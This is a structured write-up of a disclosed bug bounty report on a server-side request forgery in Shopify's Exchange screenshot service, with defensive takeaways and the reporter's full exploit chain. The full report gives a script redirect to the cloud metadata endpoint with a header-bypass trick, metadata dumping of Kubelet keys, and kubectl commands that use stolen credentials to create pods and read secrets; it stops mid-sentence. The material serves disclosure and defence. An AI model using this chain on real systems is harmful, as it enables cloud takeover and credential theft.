# SSRF in Shopify Exchange App leads to ROOT access via Google Cloud Metadata

## Metadata
- **Source:** HackerOne
- **Report:** 341876 | https://hackerone.com/reports/341876
- **Submitted:** 2018-04-22
- **Reporter:** 0xacb
- **Program:** Shopify
- **Bounty:** $25,000+
- **Severity:** critical
- **Vuln:** Server-Side Request Forgery (SSRF), Metadata Exposure, Insufficient Access Control, Information Disclosure, Kubernetes Authentication Bypass
- **CVEs:** None
- **Category:** web-api

## Summary
An SSRF vulnerability in Shopify's Exchange app screenshot functionality allowed attackers to access Google Cloud metadata endpoints. By exploiting the v1beta1 endpoint which doesn't require the Metadata-Flavor header, attackers could extract Kubelet certificates and private keys, gaining complete control over the Kubernetes cluster and all instances.

## Attack scenario
1. Attacker creates a Shopify store and edits the password.liquid template
2. Malicious JavaScript redirect in template points to Google Cloud metadata endpoint (http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token)
3. Attacker installs Exchange app which triggers automated screenshot capture of the store
4. Screenshot service renders the page and follows the redirect, accessing internal metadata
5. Screenshot image is returned containing the leaked token and sensitive metadata
6. Attacker extracts kube-env attribute containing Kubelet certificates and private keys to authenticate to Kubernetes API

## Root cause
Multiple layered failures: (1) Exchange app screenshot service performs unauthenticated requests to arbitrary URLs without validating targets against internal/private IP ranges, (2) Google Cloud metadata endpoint v1beta1 doesn't enforce Metadata-Flavor header requirement, (3) Metadata concealment not enabled on Kubernetes nodes, (4) Kubelet credentials stored in plaintext in metadata, (5) Service account token had excessive permissions (cloud-platform scope)

## Attacker mindset
Sophisticated cloud infrastructure attacker familiar with GCP architecture, Kubernetes internals, and metadata service exploitation. Demonstrates knowledge of header bypass techniques and creative workarounds for response-type filtering. Methodical reconnaissance to map available data before privilege escalation attempts.

## Defensive takeaways
- Implement strict egress filtering from screenshot/rendering services - block access to 169.254.169.254/32 and 127.0.0.1/8 and internal metadata endpoints
- Enforce Metadata-Flavor: Google header validation on ALL metadata endpoint versions, not just v1
- Enable GCP Metadata Concealment on all Kubernetes nodes
- Implement network policies to restrict metadata access from pods to only necessary services
- Rotate and restrict Kubelet credentials; use short-lived tokens instead of static certificates in metadata
- Apply least-privilege IAM to service accounts - avoid cloud-platform scope; use specific API permissions
- Implement Content Security Policy to prevent arbitrary redirects in user-controlled templates
- Validate and sanitize all URLs in screenshot service; use allowlist for permitted hosts
- Monitor and alert on metadata service access patterns from unusual sources
- Regular security audits of template systems that can execute code or control redirects

## Variant hunting
Check other Shopify services that generate screenshots/PDFs for similar SSRF vulnerabilities
Search for other metadata endpoints in v1beta1 or other legacy API versions without header enforcement
Test other cloud providers' metadata services (AWS, Azure) for similar bypass techniques
Look for screenshot services in other products that may access internal services
Hunt for similar v1beta1 endpoints in Google Cloud APIs that may have reduced security requirements
Check for alternate metadata endpoint paths or formats that bypass authentication
Investigate if similar SSRF can access other internal services (databases, caches, admin panels)
Test if the same technique can extract other credentials (RDS, database passwords, API keys)

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1552 - Unsecured Credentials
- T1552.001 - Credentials In Files
- T1526 - Gather Cloud Infrastructure Details
- T1613 - Container and Kubernetes Abuse
- T1078 - Valid Accounts
- T1087 - Gather Cloud Infrastructure Details
- T1199 - Trusted Relationship
- T1598 - Phishing for Information

## Notes
This is an exceptionally severe vulnerability combining multiple attack vectors. The attacker methodically identified that v1beta1 didn't require the Metadata-Flavor header, then used the alt=json parameter to force JSON responses suitable for image display. The ability to execute arbitrary kubectl commands suggests potential for lateral movement, data exfiltration, and complete infrastructure compromise. The fact that this affected ALL Shopify instances indicates a systemic issue with the screenshot service architecture. This writeup demonstrates excellent reconnaissance and creative bypass techniques.

## Full report
<details><summary>Expand</summary>

## The Exploit Chain - How to get root access on all Shopify instances

### 1 - Access Google Cloud Metadata
- 1: Create a store (partners.shopify.com)
- 2: Edit the template `password.liquid` and add the following content:

```html
<script>
window.location="http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token";
// iframes don't work here because Google Cloud sets the `X-Frame-Options: SAMEORIGIN` header.
</script>
```

- 3: Go to https://exchange.shopify.com/create-a-listing and install the Exchange app
- 4: Wait for the store screenshot to appear on the Create Listing page
- 5: Download the PNG and open it using image editing software or convert it to JPEG (Chrome displays a black PNG)

{F289082}

Exploring SSRFs in Google Cloud instances require a special header. However, I found really easy way to "bypass" it while reading the documentation: the `/v1beta1` endpoint is still available, does not require the `Metadata-Flavor: Google` header and still returns the same token.

I tried to leak more data, but the web screenshot software wasn't producing any images for `application/text` responses. However, I found that I could add the parameter `alt=json` to force `application/json` responses. I managed to leak more data, such as an incomplete list of SSH public keys (including email addresses), the project name (`█████`), the instance name and more:

```html
<script>
window.location="http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json";
</script>
```
{F289081}

**Can I add my SSH key using the leaked token? No**

```bash
curl -X POST "https://www.googleapis.com/compute/v1/projects/███/setCommonInstanceMetadata" -H "Authorization: Bearer ██████████████" -H "Content-Type: application/json" --data '{"items": [{"key": "0xACB", "value": "test"}]}'
```
```json
{
 "error": {
  "errors": [
   {
    "domain": "global",
    "reason": "forbidden",
    "message": "Required 'compute.projects.setCommonInstanceMetadata' permission for 'projects/███████'"
   },
   {
    "domain": "global",
    "reason": "forbidden",
    "message": "Required 'iam.serviceAccounts.actAs' permission for 'projects/███████'"
   }
  ],
  "code": 403,
  "message": "Required 'compute.projects.setCommonInstanceMetadata' permission for 'projects/████████'"
 }
}
```

I checked the scopes for this token and there was no read/write access to the Compute Engine API:
```bash
curl "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=██████████████████"
```
```json
{
 "issued_to": "███████",
 "audience": "███",
 "scope": "https://www.googleapis.com/auth/cloud-platform",
 "expires_in": 1307,
 "access_type": "offline"
}
```

### 2 - Dumping kube-env

I created a new store and pulled attributes from this instance recursively: http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/?recursive=true&alt=json

Result:
{F289455}

**Metadata concealment** (https://cloud.google.com/kubernetes-engine/docs/how-to/metadata-concealment) is not enabled, so the `kube-env` attribute is available.

Since the image is cropped, I made a new request to: http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json in order to see the rest of the Kubelet certificate and the Kubelet private key.

Result:
{F289456}

**ca.crt**
```
-----BEGIN CERTIFICATE-----
██████
███████
███████
████████
██████████████
████████
████████
███████
████
██████
███
█████████
████
████
████████
███████
███
-----END CERTIFICATE-----
```

**client.crt**
```
-----BEGIN CERTIFICATE-----
█████
███████
██████
████████
██████████
█████
██████
█████
█████
██████████
███████
█████
████
████
████████
████████
-----END CERTIFICATE-----
```

**client.pem**
```
-----BEGIN RSA PRIVATE KEY-----
█████████
██████
████████
████
████
█████████
██████████
██████
████████
█████████
██████
██████████
███
██████████
███
██████
█████████
████████
██████████
█████████
████
████
████████
████
███████
-----END RSA PRIVATE KEY-----
```

**MASTER_NAME**: █████

### 3 - Using Kubelet to execute arbitrary commands

It's possible to list all pods {F289460}:

```bash
$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://██████ get pods --all-namespaces

NAMESPACE                                   NAME                                                              READY     STATUS             RESTARTS   AGE
████████                    ██████████                    1/1    
```

And create new pods as well:
```bash
$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://████████ create -f https://k8s.io/docs/tasks/debug-application-cluster/shell-demo.yaml

pod "shell-demo" created
$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://██████████ delete pod shell-demo

pod "shell-demo" deleted
```

I didn't tried to delete running pods, obviously, I'm not sure if I would be able to delete them with user `████████`. However, it's not possible to execute commands in this new pod or any other pod:
```bash
$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://█████████ exec -it shell-demo -- /bin/bash

Error from server (Forbidden): pods "shell-demo" is forbidden: User "███" cannot create pods/exec in the namespace "default": Unknown user "███"
```

The `get secrets` command doesn't work, but it's possible to describe a given pod and the get the secret using its name. That's how I leaked the kubernetes.io service account token using the instance `████` from the namespace `████`:

```bash
$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://███ describe pods/█████ -n █████████

Name:           ████████
Namespace:      ██████
Node:           ██████████
Start Time:     Fri, 23 Mar 2018 13:53:13 +0000
Labels:         █████
                ████
                █████
Annotations:    <none>
Status:         Running
IP:             █████████
Controlled By:  █████
Containers:
  default-http-backend:
    Container ID:   docker://███
    Image:          ██████
    Image ID:       docker-pullable://█████
    Port:           ████/TCP
    Host Port:      0/TCP
    State:          Running
      Started:      Sun, 22 Apr 2018 03:23:09 +0000
    Last State:     Terminated
      Reason:       Error
      Exit Code:    2
      Started:      Fri, 20 Apr 2018 23:39:21 +0000
      Finished:     Sun, 22 Apr 2018 03:23:07 +0000
    Ready:          True
    Restart Count:  180
    Limits:
      cpu:     10m
      memory:  20Mi
    Requests:
      cpu:        10m
      memory:     20Mi
    Liveness:     http-get http://:███/healthz delay=30s timeout=5s period=10s #success=1 #failure=3
    Environment:  <none>
    Mounts:
      ██████
Conditions:
  Type           Status
  Initialized    True
  Ready          True
  PodScheduled   True
Volumes:
 ██████████:
    Type:        Secret (a volume populated by a Secret)
    SecretName: ███████
    Optional:    false
QoS Class:       Guaranteed
Node-Selectors:  <none>
Tolerations:     node.kubernetes.io/not-ready:NoExecute for 300s
                 node.kubernetes.io/unreachable:NoExecute for 300s
Events:          <none>
```

```bash
$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://██████ get secret███████ -n ███████ -o yaml

apiVersion: v1
data:
  ca.crt: ██████████
  namespace: ████
  token: ██████████==
kind: Secret
metadata:
  annotations:
    kubernetes.io/service-account.name: default
    kubernetes.io/service-account.uid: ████
  creationTimestamp: 2017-01-23T16:08:19Z
  name:█████
  namespace: ██████████
  resourceVersion: "115481155"
  selfLink: /api/v1/namespaces/████████/secrets/████
  uid: █████████
type: kubernetes.io/service-account-token
```

And finally, it's

</details>

---
*Analysed by Claude on 2026-05-11*
